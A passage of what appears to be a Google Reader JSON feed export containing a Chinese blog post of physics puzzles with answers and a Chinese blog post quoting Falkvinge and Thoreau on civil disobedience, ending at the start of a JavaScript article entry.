点出发，将沿最短路径绕过山尖一周，再回到 A 点。如果把圆锥的侧面展开成扇形，绳圈其实就像下面这样（图中的 A 点和 A&#39; 点在圆锥上是同一个点）。</p>\n<p>    <img src=\"http://www.matrix67.com/blogimage_2011/2011060214.png\" alt=\"\"></p>\n<p>    显然，当这个扇形的顶角小于 180 度时，这样的绳圈才可能存在；而当这个扇形的顶角大于 180 度时，拉紧的绳圈就会滑到山尖外面去。据此不难推出，所求的临界情况就是，圆锥的高与母线的夹角为 30 度。</p>\n<p> <br>\n <br>\n    <strong>n 块相同的木板重叠，最多能够伸出桌面多远？</strong></p>\n<p>    <img src=\"http://www.matrix67.com/blogimage_2011/2011060215.png\" alt=\"\"></p>\n<p>    这是一个非常经典的问题。传统的答案是，把第一块木板的重心放在第二块木板的右边缘，把这两块木板的重心放在第三块木板的右边缘，把这三块木板的重心放在第四块木板的右边缘⋯⋯利用杠杆原理可以推出，如果每块木板都是单位长，那么 n 块木板可以伸出桌面 (1 + 1/2 + 1/3 + … + 1/n) / 2 个单位的长度。由调和级数的性质，我们立即可以得知，只要木板数量足够多，木块伸出桌面的长度是没有上界的，想伸出去多长就能伸出去多长。但同时，这个增长速度也非常缓慢⋯⋯ 20 块木板只能伸出大约 1.79887 个单位的长度， 1000 块木板也只能伸出大约 4.8938 个单位的长度。</p>\n<p>    <img src=\"http://www.matrix67.com/blogimage_2011/2011060216.png\" alt=\"\"></p>\n<p>    不过，采用一些其它的方案（比如拿几块木板在后方作为“配重”），我们可以让木板伸出的长度更远。下面是一篇非常经典的论文，总结了目前对这个问题的研究结果： <a href=\"http://arxiv.org/abs/0707.0093\">http://arxiv.org/abs/0707.0093</a> 。</p>\n<p> <br>\n <br>\n    <strong>上楼时，人克服重力做功，需要耗费很多能量。但是，在平地上行走时，人并没有做功。那么，为什么我们走路时还要耗费能量呢？</strong></p>\n<p>    1999 年 3 月的 Scientific American 上说到，其实在步行时，我们也是要克服重力做功的。这是因为，在步行的过程中，人的重心会一上一下地摆动。当两腿一前一后着地时，人的重心偏低；而单腿着地迈步时，人的重心会升高大约 3cm 。我们走路的能量主要就消耗在了这里。<br>\n    当然，事实上，即使人不走路，光是原地站着，也是要耗费能量的（大约为 80W ）。假设人的步行速度是 v ，那么步行所用的能量可以用公式 P = 80W + K·v 大致算出，其中 K·v 就是步行过程中耗费的能量，系数 K 大约为 160N 。<br>\n    教中学物理最怕聪明孩子，一些古怪的问题常常会让老师也支支吾吾答不上来。初中物理中，有几个最不好给学生解释的事情。走路不做功，为什么还要耗费能量？电流从电厂来又回到电厂去，为什么我们还要支付电费？把装满水的水杯不盖纸片直接倒过来，为什么大气压没有把水支撑起来？拳头打在墙上后将会受到墙给拳头的反作用力，但若拳头挥空了，这个力的反作用力是什么？<br>\n    你都打算怎么解释？</p>\n<p> <br>\n <br>\n    <strong>橄榄油的沸点是 300℃ ，锡的熔点是 231.9℃ 。为什么我们能在锡锅里炸东西？</strong></p>\n<p>    答案：橄榄油并没有沸腾，沸腾的其实是食物里的水。而且，正是食物里的水才让橄榄油和锡锅都保持在 100℃ 。如果食物里的水被烧干了，食物就会被烧焦，锡锅当然也会被烧毁。</p>\n<p> <br>\n <br>\n    <strong>在晃动的火车车厢上，把一瓶水放在小桌子上。如果想让这瓶水放得更稳，有一个极其简单的方法。这个方法是什么？</strong></p>\n<p>    答案：喝掉一部分水，让整瓶水的重心下降。<br>\n    注意，这里又有一个有趣的极值问题。如果瓶子里装满水，整个系统的重心显然要比只装有一部分水时更高；但若把水全部喝掉，只剩一个空瓶子，整个系统的重心仍然会比有一部分水时高。建立模型，求出使得整个系统重心最低的水位高度，是一个绝佳的物理课题。<br>\n    有一个蛮有意思的结论：当整个系统的重心达到最低时，水位一定和此时整个系统的重心高度相同。其实这个很好理解：当水位没有达到整个系统的重心高度时，每加一点水，都相当于在重心下方填充质量，让重心下降；但水位高度超过了整个系统的重心，则每加一点水，都相当于在重心上方新添质量，重心便会开始上升了。</p>\n<p> <br>\n <br>\n    <strong>12 节 1V 的电池首尾相接，然后将一块电压表如图连接。电压表的示数是多少？</strong></p>\n<p>    <img src=\"http://www.matrix67.com/blogimage_2011/2011060217.png\" alt=\"\"></p>\n<p>    有时候，方言的力量真是强大。看到这个题目后，我脑子里闪过的第一个形容词就是重庆话“想得出来”，但始终没找到合适的普通话替代词。总之，这题可以说是非常具有想象力了。<br>\n    答案是 0V 。假设每个电池的内电阻是 R ，这个回路的电流就等于 12V 除以 12R ，即 (1V)/R 。于是，每个电池的内电压就是 R·(1V)/R = 1V ，而这恰好是这个电池的电动势。因此，每个电池的外电压都为 0 。对于一组连续的电池来说，这个推理同样成立。</p>\n<p> <br>\n <br>\n    <strong>为什么跳蚤、蚱蜢、人和狮子，尺寸差异那么大，但能跳起的最高高度都是 1 米左右（最多相差一个不超过 2 的系数）？</strong></p>\n<p>    看到这个问题之后，我在 Google 里搜了一下，竟然真是这样。猫猫狗狗老鼠老虎，可以跳起的高度都在 1 米这个尺度左右——猫猫和狗狗都能跳 1 米左右，老鼠能跳 40 厘米，老虎能跳 2 米。你以为袋鼠牛 B 吗？其实袋鼠也只能跳 2 到 3 米高。注意，这里的跳起高度并不是指“手能摸到的高度”，而是生物让自己重心升高的高度。<br>\n    有人可能想到了原因。一个动物身体小，力量也小，但正因为它身体小，跳起 1 米也不需要太大的力。反之，大型动物力量倒是大，不过要跳起来确实也需要很大的力。这就让动物们能够跳起的高度变得平衡。<br>\n    不过，为什么这两个因素能够平衡，而不是一个压过另一个呢？假设生物的形体和密度都相近，我们就可以漂亮地证明这一点：把一次跳跃中足部可以提供的能量记作 E ，生物自身的重量则记作 W ，那么生物跳起的高度应该正比于 E/W 。如果再把生物的尺寸（一维上的长度，比如身长）记作 L ，那么 W 是与 L<sup>3</sup> 成正比的。而 E 则等于肌肉提供的力乘以这个力能够牵引的肢体运动距离，其中前者与肌肉的横截面积成正比，也就与 L<sup>2</sup> 成正比，后者和足部长度成正比，也就是和 L 成正比。因此， E 和 L<sup>3</sup> 成正比。于是， E/W 与 L 无关！<br>\n    小时候大家应该都听说过，跳蚤巨牛无比，能跳起 1 米多高，是自身高度的 100 多倍。原来，不管什么都能跳起 1 米多高，这个倍数关系这么惊人，只是因为跳蚤自己太矮罢了。</p>\n<p> <br>\n <br>\n    <strong>一个空心正方体的内部有六面墙。能否让一个小球在每一面墙上都各反弹一次，最后又回到出发点（假设没有重力）？</strong></p>\n<p>    <img src=\"http://www.matrix67.com/blogimage_2011/2011060218.gif\" alt=\"\"></p>\n<p>    可以。这是由 Hugo Steinhaus 首先发现的。注意，每反弹一次，只会让速度中的其中一个分量变为相反数，因此六次反弹后，速度向量会和出发时相同。为了让六次反弹后还能回到出发点，我们只需要再让各段路程的长度都相同就行了。上图中的方案里，每段路程都是一个小立方体的对角线，因而最后就正好能回到原点。</p>\n<p> <br>\n <br>\n    <strong>一个物块从高度为 h 的光滑斜面顶端开始下滑，下滑到底端后沿光滑水平面以速度 v 匀速直线运动下去。初始时，物块的重力势能为 mgh ；到了斜面底部后，重力势能为0，完全转化为了动能 (1/2)mv<sup>2</sup>。由此我们可以解出， v = √<span style=\"text-decoration:overline\">2gh</span> 。</strong><br>\n    <strong>现在，假设你坐在一个以 v 的速度向右做匀速直线运动的车里。如果以你为参照物，你将会看到，斜面顶端的物块初始时机械能为 mgh + (1/2)mv<sup>2</sup>，而到了斜面底端后，机械能突然变成 0 了！这该怎么解释呢？</strong></p>\n<p>    <img src=\"http://www.matrix67.com/blogimage_2011/2011060219.png\" alt=\"\"></p>\n<p>    这是一个非常漂亮的问题，大家不妨多想一想。简单地说，就是在新的参照系下，物体并不是沿着直线下滑，斜面也对物体做功了。不过，这只能解释一部分“消失”的机械能。具体答案在 <a href=\"http://star.tau.ac.il/QUIZ/99/A07.99.html\">http://star.tau.ac.il/QUIZ/99/A07.99.html</a>。<br>\n    有网友来信说，从根本原因上看，只要把斜面本身也算进系统里，考察斜面的能量，就不会产生不守恒的问题了。</p>\n<p> <br>\n <br>\n    <strong>有一段横截面是等边三角形的木头，密度为 0.5g/cm<sup>3</sup> 。它在水中漂浮时，哪头会朝上？</strong></p>\n<p>    <img src=\"http://www.matrix67.com/blogimage_2011/2011060220.png\" alt=\"\"></p>\n<p>    答案：如图所示，漂浮时，它的其中一条中线一定和水面重合。这是因为，通过计算可知，此时整个物体的重心 G<sub>1</sub> 和浸入水中的部分的重心 G<sub>2</sub> （也就是浮力的作用点）正好在同一竖直线上，并且高度差达到最小值。</p>\n<p> <br>\n <br>\n    <strong>20 世纪初，一本名为 Power 的杂志上曾经登载了这样一个永动机模型。如图，把光滑绳圈套在滑轮上，绳圈右侧浸在水中。于是，绳圈右侧将持续受到一个竖直向上的浮力，绳子便逆时针转动了起来。</strong><br>\n    <strong>这个永动机模型可行吗？如果不可行，问题出在哪儿？</strong></p>\n<p>    <img src=\"http://www.matrix67.com/blogimage_2011/2011060221.png\" alt=\"\"></p>\n<p>    答案：废话，当然不可行。可是，这个模型错在哪儿呢？注意，浮力其实是物体上下表面的液体压强差产生的。因此，浮力只会出现在完全浸入液体，或者漂浮在液体表面的物体上。在这个例子中，绳子并不会受到浮力。如果你把绳子想像成是一片片圆盘拼成的，每个圆盘都只受到侧面来的液体压强，在绳子的方向上是不可能有力产生的。<br>\n    围观更多的永动机，请移步 <a href=\"http://en.wikipedia.org/wiki/History_of_perpetual_motion_machines\">http://en.wikipedia.org/wiki/History_of_perpetual_motion_machines</a> 。</p>\n<p> <br>\n <br>\n    <strong>秤上放着一个玻璃瓶子，瓶盖是密封的。一只苍蝇飞在瓶子中，没有挨着瓶子。秤的示数等于瓶子的重量，还是大于瓶子的重量？如果苍蝇靠栓在身上的一个小氢气球浮在瓶子中呢？</strong></p>\n<p>    这是一个经典问题了。对于前一个问题，秤的示数应该大于瓶子的重量，多的这点重量正好就是苍蝇自身的重量。这是因为，苍蝇要想飞起来，必须要给空气一个等于自身重量的向下的力（从而获得一个等于自身重量的向上的力）。空气将会把这个力传到瓶底，也就是对瓶底施加一个相同的力。<br>\n    对于第二个问题，答案是，秤的示数就等于瓶子的重量。如果苍蝇受空气浮力悬浮在空中，我们就可以把苍蝇连同气球所占据的位置等价地用空气来替换，毕竟瓶子里悬浮着一只气球苍蝇和悬浮着一坨空气没什么两样嘛。这样看来，秤的示数就是瓶子的重量了。<br>\n    这个问题扯开来，也有一大堆可以说的。初中物理有一道经典题目：把一杯水放在秤上，然后手指伸进水里（手指未碰到杯底，水未溢出），问秤的示数怎么变。答案是，变大了。因为水位升高，对杯底的水压增大了，从而杯底受到的压力也就增大了。当然，按照之前的思路，我们还有一个更好的解释。你的手指受到了一个竖直向上的浮力，水自然也就受到了一个竖直向下的反作用力，这个力的大小就等于手指排开水的重量。因此，你可以把手占据的位置替换成一堆水。可见，杯子里的水量相当于是凭空增加了，秤的示数自然也就增加了。<br>\n    大家估计听过一个脑筋急转弯，说一个独木桥载重 80 公斤，为什么一个重 70 公斤的人可以拿着两个各重 10 公斤的球过桥？答案是，这个人像杂技演员一样，轮流把球扔到空中，保证手里只有一个球。不过大家仔细想想便会发现，这个题明显有 bug 。你需要给球一个大于 10 公斤的力，才能让球加速上升；此时，球会给你一个大于 10 公斤的反作用力，这样就超过独木桥的载重了。</p>\n<p> <br>\n <br>\n    <strong>云是由小水滴组成的。水的密度是空气密度的 800 多倍。为什么云不会掉下来？</strong></p>\n<p>    我操，这个问题太有型了！我在反省自己，为什么小时候听说“云是由小水滴组成的”的时候，没有提出过这个问题呢？<br>\n    这个问题的答案是，云就是会往下掉的，只不过下落的速度非常慢⋯⋯<br>\n    云中的小水滴颗粒极小，因而小水滴受到的空气阻力，其数量级和自身重力相当。计算可知， 1 微米的水滴下落速度约为 0.13 毫米每秒，也就是一天下降 11 米。即使是 10 微米的水滴，下落速度也很慢，大约每天 1.1 千米。如果不精确测量的话，我们是没办法观察到的。详细计算过程可以见这里： <a href=\"http://star.tau.ac.il/QUIZ/98/A10.98.html\">http://star.tau.ac.il/QUIZ/98/A10.98.html</a> 。<br>\n    这让我想起一个冷知识：蚂蚁是摔不死的，因为空气阻力和自身重力相当。这又让我想起一个冷笑话：蚂蚁从摩天大楼摔下去，是怎么死的？答案是——饿死的。</p>\n<p> <br>\n <br>\n    <strong>利用蹦床一次，你可以跳到多高？</strong></p>\n<p>    答案：两倍原地起跳的高度。蹦床自己既不会消耗能量，也不会提供能量，因而你跳到蹦床上以后，蹦床储存的弹性势能只能把你弹回到一次起跳的高度。你在蹦床上再跳一次，便能跳到两倍高。</p>\n<p> <br>\n <br>\n    <strong>大家在电影的各种爆炸场面里都会看见这样一个情景：一个正在倒下的烟囱，在倒下的过程中，会自己断成两截。断裂处将出现在烟囱的什么位置？</strong><br>\n    <strong>这是 MIT 的一道入学考试题。</strong></p>\n<p>    <img src=\"http://www.matrix67.com/blogimage_2011/2011060222.png\" alt=\"\"></p>\n<p>    这个问题很漂亮。在断裂之前，整个烟囱显然以一个相同的角速度在下落。考虑烟囱的顶部，由于自身重力的影响，它本来应该下落得更快，但却被强行地“扳”回到一个和烟囱下部相同的角速度。这使得烟囱最终发生断裂。计算可知，断裂将发生在烟囱的 2/3 处。更技术的分析请看 <a href=\"http://star.tau.ac.il/QUIZ/96/A07.96.html\">http://star.tau.ac.il/QUIZ/96/A07.96.html</a> 。</p>\n<p> <br>\n <br>\n    <strong>为什么床单、被罩、桌布上的污渍都是这种形状？</strong></p>\n<p>    <img src=\"http://www.matrix67.com/blogimage_2011/2011060223.jpg\" alt=\"\"></p>\n<p>    相信大家都曾经遇上过这样的现象吧。这个问题要解释起来，还真不容易——网上提出此问题后，无一人答对。很多人都说，液体中含有什么什么，布料里含有什么什么等等。其实，这种现象是很普遍的，它与布料、溶剂、溶质都没关系。这种现象真正的原因，是和液体蒸发的模式有关的。如果液体表层蒸发了，液体会向外展开，填充刚刚流失的部分。其结果就是，液体会不断地向边缘涌去，造成了边缘痕迹堆积。</p>\n<p>    <img src=\"http://www.matrix67.com/blogimage_2011/2011060224.png\" alt=\"\"></p>\n<p>    对几种不同的蒸发模式进行模拟，可以看到不同的污渍形状，进而很好地说明了上述推测的正确性。</p>\n<p>    <img src=\"http://www.matrix67.com/blogimage_2011/2011060225.png\" alt=\"\"></p>\n<p> <br>\n <br>\n    <strong>为什么水渍是深色的？</strong></p>\n<p>    这是个好问题呀！我们每天都会遇上这样的事情，已经习以为常，却从来没有想过为什么。真要问个为什么，嘿，还真不好回答。<br>\n    在网站上，这个问题同样无人答对。根据布料的不同，官方给出了两种解释，大家可以去看看： <a href=\"http://star.tau.ac.il/QUIZ/96/A11.96.html\">http://star.tau.ac.il/QUIZ/96/A11.96.html</a> 。</p>\n<p> <br>\n <br>\n    最后，附上一些我以前收集的一些漂亮的物理谜题。</p>\n<p> <br>\n <br>\n <br>\n    <strong>你现在正位于赤道，此时太阳刚刚升起。你要用一把激光炮轰炸太阳中心。你应该瞄准什么地方？</strong></p>\n<p>    你应该瞄准太阳的中心。有人会说，不对呀，阳光不是会被大气层折射吗？但是，你射出的激光也会被折射，由于光路是可逆的，因而你就该瞄准你看到的太阳。有人会说，还是不对呀，太阳光射到地球需要 8 分钟，你看到的太阳是 8 分钟前的太阳，现在太阳已经不在原来的位置了呀？你又被坑了——太阳是不动的，动的其实是地球。</p>\n<p> <br>\n <br>\n    <strong>用天平测量物体的重量（准确地说，是质量）时，如果砝码有磨损，那么测量结果会偏大还是偏小？仔细想想吧，这题很容易答错。</strong></p>\n<p>    这是初中物理最阴险的陷阱题目之一。绝大多数人会认为，既然砝码被磨损了，没有它标识的那么重了，那么测量结果一定是偏小了。答案恰恰相反，如果砝码有磨损，测量结果应该偏大了。 正因为砝码没有它标识的那么重，所以我们才需要在天平上添加更多的砝码让它保持平衡。因此，测量出来的结果会更大一些。</p>\n<p> <br>\n <br>\n    <strong>用一盆水，一张纸，一台电子秤，如何测量一个给定排球击打在地上对地的作用力有多大？</strong></p>\n<p>    首先把纸张铺在地上，在排球上蘸水，然后对着地上的纸击打。这样一来，纸上便留下了一个圆形的水印。然后，把印有水的纸铺在电子秤上，把排球放在纸上，一点一点向下挤压排球，直到排球的下底面与水印重合。此时，电子秤上的示数也就是排球击打在地上时的作用力了。<br>\n    这是间接测量实验设计问题中让人拍案叫绝的一道好题。</p>\n<p> <br>\n <br>\n    <strong>一个人站在湖里的一艘船上，把一颗石子扔进湖里。湖水的水位将会发生怎样的变化？</strong></p>\n<p>    答案：湖面将会变低。这是一个非常经典的初中物理问题。由浮力公式，物体所受的浮力等于它排开水的重力。初始时，船、人、石子都在水面上静止，他们的总浮力（也就是总的排开水重量）等于总重力；但石子投入水中后将会沉底，它所受到的浮力小于它的重力，因此船、人、石子的总浮力（同样即为排开水的总重）小于他们总重力。也就是说，排开水的总量减少了，因而水位将会下降。<br>\n    这是最标准的解法。每次讲到这个问题时，我都喜欢讲讲另外一种直观的理解方法。不妨把这个将会被投掷出去的石子悬挂在船的底部。由于漂浮在水面上的船、人和石子的总重力不变，因此总的排开水重量也不变，这样的假设不会改变水位高度。现在，把悬挂石子的绳子剪断，于是石子下沉，船会上浮一些，致使水位下降。</p>\n<p> <br>\n <br>\n    <strong>两根一模一样的金属棒，一根是磁铁，一根是普通的金属棒。没有其他工具，怎样把他们区别开来？</strong></p>\n<p>    把他们摆成一个 T 字形。如果相吸，竖着的就是磁铁；如果没有相吸，横着的就是磁铁。<br>\n    磁铁中部几乎没有磁性。</p>\n<p> <br>\n <br>\n    <strong>为什么镜子里的东西是左右颠倒的，不是上下颠倒的？</strong></p>\n<p>    这是一道经典智力题了，镜子问题、羊与车问题和 0.9999… = 1 的问题可谓是引发口水战的三大法宝。哪个论坛想要增加人气的话，把这三个问题挨着发一遍就行了。问题的答案是，镜子里的东西既不是左右颠倒，也不是上下颠倒，而是前后颠倒的。不过，人们似乎并不喜欢接受“镜像”的概念，总爱拿镜子里的东西跟实际的东西来比。但是，两个镜像的东西怎么转都不能完全重合，于是纠结的事情就发生了。如果你想象镜子里的东西水平转 180 度转回去，这并不能和实际物体重合，每个东西都左右颠倒了。如果你想象镜子里的东西竖直方向转 180 度，这样也不能和镜子前的物体重合——左右倒是没问题，但上下就颠倒了。不过，人们生活在一个水平面上，人本身的对称轴正好又是竖直方向上，因此人总是习惯性地采用了前一种思维。<br>\n    为了摆脱传统思维的束缚，不妨假设镜子前的物体是一个三角形什么的，想象起来就会方便多了。<br>\n    Geek 小美女 <a href=\"http://localhost-8080.com/2011/03/why-counterclockwise-open/\">localhost_8080</a> 曾对左手右手左手系右手系左右颠倒左右镜像纠结过很久，她曾在 Twitter 上提过一个非常有趣的问题：某地外生命在飞船中，你只能用无线电与它交流，如何通过口头描述指导它在一双手套中分辨出右边的那一只？<br>\n    你打算怎么办？</p><img src=\"http://www1.feedsky.com/t1/526871265/matrix67/feedsky/s.gif?r=http://www.matrix67.com/blog/archives/4372\" border=\"0\" height=\"0\" width=\"0\">"
    },
    "author" : "Matrix67",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://www.matrix67.com/blog/feed.asp",
      "title" : "Matrix67: My Blog",
      "htmlUrl" : "http://www.matrix67.com/blog"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1307172353105",
    "timestampUsec" : "1307172353105730",
    "id" : "tag:google.com,2005:reader/item/557faeaee46a2247",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred", "Politics" ],
    "title" : "不正义的法律，不服从的公民",
    "published" : 1307106870,
    "updated" : 1307106870,
    "alternate" : [ {
      "href" : "http://www.ruanyifeng.com/blog/2011/06/unjust_laws_and_disobedient_citizens.html",
      "type" : "text/html"
    } ],
    "summary" : {
      "direction" : "ltr",
      "content" : "<p><a href=\"http://torrentfreak.com\">TorrentFreak</a>是一个新闻网站，专门报道BT下载。</p><p><a href=\"http://torrentfreak.com/\"><img src=\"http://image.beekka.com/blog/201106/bg2011060301.jpg\"></a></p>\n\n<p>上周，它罕见地发表了一篇政论，不谈下载，完全谈政治。文章的题目叫做<a href=\"http://torrentfreak.com/it-is-everybodys-duty-to-defy-unjust-laws-110529/\">《反抗不正义的法律是公民的天职》</a>（It Is Everyone's Duty To Defy Unjust Laws），作者是瑞典<a href=\"http://www.ruanyifeng.com/blog/2006/07/pirate_party.html\">盗版党</a>的创始人Rick Falkvinge。</p>\n\n<p><img src=\"http://image.beekka.com/blog/201106/bg2011060302.jpg\"></p>\n\n<p>他的本意是呼吁大家一起行动，改变不合理的版权法。但是实际上，他触及了一个更深层的问题----<strong>如果法律是错的，你觉得自己应该怎么办？</strong></p>\n\n<p>他的观点非常鲜明：<strong>盲目的守法，不是善，而是恶；反抗不正义的法律是公民的天职。</strong></p>\n\n<p>文章一开头就气势如虹：</p>\n\n<blockquote>\n\n<p>I sometimes hear people claim that laws exist to be followed. These people are the most dangerous people who exist in a society. </p>\n\n<p><strong>\"有人说，只要是法律，就要遵守。这种说法对于社会极其危险。\"</strong></p>\n\n</blockquote>\n\n<blockquote>\n\n<p>Tyranny is never upheld through law; it is upheld through thousands of bureaucrats that follow the letter of the law just because they believe in rules and law.</p>\n\n<p><strong>\"暴君为什么能够维持统治？就是因为他手下有千千万万盲目守法的官僚。\"</strong></p>\n\n</blockquote>\n\n<p>那么，为什么不能盲目遵守法律？</p>\n\n<p>有两个原因。</p>\n\n<p>第一，法律并不是最高的行事准则，世界上存在更高的价值标准。</p>\n\n<blockquote>\n\n<p>Doing so in a conscious way dates back to Socrates, who was the first to claim that there is a moral law that transcends and supersedes the law of the land.</p>\n\n<p><strong>\"早在古希腊，苏格拉底就说过，国王的法律之上，还有一种道德的法律（moral law）。\"</strong></p>\n\n</blockquote>\n\n<p>第二，法律往往不代表普遍的正义，而只代表掌权者的\"正义\"。</p>\n\n<blockquote>\n\n<p>Laws are not made because they are righteous. Laws are made because they advance somebody's political career.</p>\n\n<p><strong>\"法律之所以被制定出来，并不是因为它们是正确的，而是因为它们符合某个政治家（集团）的利益。\"</strong></p>\n\n</blockquote>\n\n<p>很多人嘴里说\"要守法\"，但是并非真心认为应该如此，而是以此作为推卸个人责任的借口。既然法律有规定，那就照着做吧，何必去想对不对。</p>\n\n<p>这是非常危险的做法，正确的做法应该像下面这样：</p>\n\n<blockquote>\n\n<p>A person who considers the orders, rules or laws to be wrong has a duty to defy them. Every single war criminal learned this before they were hanged. On the other hand, many resistance fighters learned the opposite before they were shot.</p>\n\n<p><strong>\"如果你认为某个法律是错的，是不公不义的，那么你就有责任去质疑它、违抗它，而不是盲目遵守它。\"</strong></p>\n\n</blockquote>\n\n<blockquote>\n\n<p>At the end of the day, you have only your own moral compass. You must decide whether to follow the law, and in considering this, you need to understand why the law was made in the first place.</p>\n\n<p><strong>\"最终来说，你的道德价值观才是你的指南针。你必须自己决定遵守哪些法律。为了做到这一点，你必须知道最高的价值观是什么。\"</strong></p>\n\n</blockquote>\n\n<blockquote>\n\n<p>Usually, it makes sense to follow most laws, most of the time. But not all laws, all of the time. People who are standing waiting at a hung red stoplight at 2am with no human being nor car in sight are not just stupid, but downright dangerous.</p>\n\n<p><strong>\"大多数时候，我们应当遵守大多数法律。但是，我们不应当在所有时候，遵守所有的法律。\"</strong></p>\n\n</blockquote>\n\n<blockquote>\n\n<p>Does this mean I encourage breaking the law? No. Mostly it doesn't mean that because doing so would be too flauntingly illegal. However, in the spirit of discretion, I encourage everybody to follow their own moral compass and to help their fellow human beings.</p>\n\n<p><strong>\"我这样说，是不是鼓励大家去违法？不，从事非法活动，往往会有危险的后果。出于谨慎原则，我鼓励大家跟随自己的道德价值观，判断一件事该不该做。\"</strong></p>\n\n</blockquote>\n\n<p>=================================================</p>\n\n<p>原文写到这里就结束了，但是它让我想到了另一篇更有名的文章----19世纪美国作家梭罗的<a href=\"http://en.wikipedia.org/wiki/Civil_Disobedience_(Thoreau)\">《论公民的不服从》</a>（Civil Disobedience）。</p>\n\n<p><img src=\"http://image.beekka.com/blog/201106/bg2011060303.jpg\"></p>\n\n<p>该文发表于1849年，正是南北战争前夕，梭罗认为一个支持黑奴制度的美国政府是邪恶的政府，公民不应该服从这样的政府。他雄辩地阐述了，个人的良知（consciences）高于强权（power），反抗一个不正义（injustice）的制度是每个公民的责任（duty）。</p>\n\n<p>这篇文章深深影响了后来的托尔斯泰、甘地、马丁·路德金等进步人士，成为\"非暴力，不合作\"运动的基础。虽然它与上文相隔162年，但是根本观点和内在精神完全一致，读起来竟然有一种浑然一体的感觉。</p>\n\n<p>下面就是我对梭罗的那篇文章的一些摘录，强烈推荐。</p>\n\n<blockquote>\n\n<p>The government itself, which is only the mode which the people have chosen to execute their will, is equally liable to be abused and perverted before the people can act through it. </p>\n\n<p><strong>\"政府只是人民用来有效行使他们的意志的一种形式。在人民还来不及贯彻他们的意志之前，政府也能同样有效地被滥用或误用。\"</strong></p>\n\n</blockquote>\n\n<blockquote>\n\n<p>Governments show thus how successfully men can be imposed upon, even impose on themselves, for their own advantage.</p>\n\n<p><strong>\"政府的存在表明，为了自己的利益，一部分人可以如此成功地驾驭这个机构，甚至可以驾驭人民。\"</strong></p>\n\n</blockquote>\n\n<blockquote>\n\n<p>when the power is once in the hands of the people, a majority are permitted, and for a long period continue, to rule is not because they are most likely to be in the right, nor because this seems fairest to the minority, but because they are physically the strongest. But a government in which the majority rule in all cases can not be based on justice, even as far as men understand it. </p>\n\n<p><strong>\"当人民掌权后，多数派将控制政权，而且长期控制，这不是因为他们非常正义，也不是因为少数派认可他们，而是因为他们具有最强大的实力。但是，一个由多数派控制一切的政府，是不可能建立在正义之上的，即使是表面的正义也做不到。\"</strong></p>\n\n</blockquote>\n\n<blockquote>\n\n<p>I think that we should be men first, and subjects afterward. It is not desirable to cultivate a respect for the law, so much as for the right.  The only obligation which I have a right to assume is to do at any time what I think right.</p>\n\n<p><strong>\"我认为，我们首先必须做人，其后才是做国王的顺民。让人们像尊重正义一样尊重法律，这是不可取的。我应该承担的唯一义务是，不论何时都从事我认为是正义的事。\"</strong></p>\n\n</blockquote>\n\n<blockquote>\n\n<p>But when the friction comes to have its machine, and oppression and robbery are organized, I say, let us not have such a machine any longer. </p>\n\n<p><strong>\"如果机器内部的故障控制了整个机器，并进行有组织的欺压与掠夺，那么，就让我们扔掉这部机器吧。\"</strong></p>\n\n</blockquote>\n\n<blockquote>\n\n<p>But it is the fault of the government itself that the remedy is worse than the evil. It makes it worse. Why is it not more apt to anticipate and provide for reform? Why does it not cherish its wise minority? Why does it cry and resist before it is hurt? Why does it not encourage its citizens to put out its faults, and do better than it would have them? </p>\n\n<p><strong>\"那是政府的过错，政府使局势变得更糟。为什么政府不善于预见改革，并为其提供机会呢？为什么政府不珍惜少数派的智慧呢？为什么政府不见棺材不落泪呢？为什么政府不鼓励老百姓为它指出错误，改进工作呢？\"</strong></p>\n\n</blockquote>\n\n<blockquote>\n\n<p>Any man more right than his neighbors constitutes a majority of one already. </p>\n\n<p><strong>\"任何人只要比周围的人更正义一些，也就构成了一人的多数。\"</strong></p>\n\n</blockquote>\n\n<p>（完）<br>\n</p><div style=\"color:#556677;line-height:160%;padding:0.3em 0.5em;border:1px solid #d3d3d3;margin:1em;background-color:#aad2f0;border-radius:10px\"><h3>文档信息</h3>\n<ul>\n<li>版权声明：自由转载-非商用-非衍生-保持署名 | <a href=\"http://creativecommons.org/licenses/by-nc-nd/3.0/deed.zh\">Creative Commons BY-NC-ND 3.0</a></li>\n<li>原文网址：<a href=\"http://www.ruanyifeng.com/blog/2011/06/unjust_laws_and_disobedient_citizens.html\">http://www.ruanyifeng.com/blog/2011/06/unjust_laws_and_disobedient_citizens.html</a></li>\n<li>最后修改时间：2011年6月27日 00:41</li>\n<li>付费支持（<a href=\"http://www.ruanyifeng.com/blog/2011/05/my_google_adsense_is_disabled.html\" style=\"text-decoration:underline\">说明</a>）：<a href=\"https://lab.alipay.com/p.htm?id=2011051700196144\"><img src=\"http://www.ruanyifeng.com/blog/images/rmb_32.png\" alt=\"支付宝担保交易\" style=\"border:none;vertical-align:middle\"></a> | <a href=\"https://www.paypal.com/cgi-bin/webscr?cmd=_xclick&amp;business=yifeng.ruan@gmail.com&amp;currency_code=USD&amp;amount=0.3&amp;return=http://www.ruanyifeng.com/thank.html&amp;item_name=Ruan%20YiFeng&#39;s%20Blog&amp;undefined_quantity=1&amp;no_note=0\"><img src=\"http://www.ruanyifeng.com/blog/images/dollar_32.png\" alt=\"paypal\" style=\"border:none;vertical-align:middle\"></a> </li>\n</ul></div>"
    },
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://feeds.feedburner.com/ruanyifeng",
      "title" : "阮一峰的网络日志",
      "htmlUrl" : "http://www.ruanyifeng.com/blog/"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1306254471009",
    "timestampUsec" : "1306254471009038",
    "id" : "tag:google.com,2005:reader/item/013f7dc09609b490",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred", "IT" ],
    "title" : "如何判断Javascript对象是否存在",
    "published" : 1305270516,
    "updated" : 1305270516,
    "alternate" : [ {
      "href" : "http://www.ruanyifeng.com/blog/2011/05/how_to_judge_the_existence_of_a_global_object_in_javascript.html",
      "type" : "text/html"
    } ],
    "summary" : {
      "direction" : "ltr",
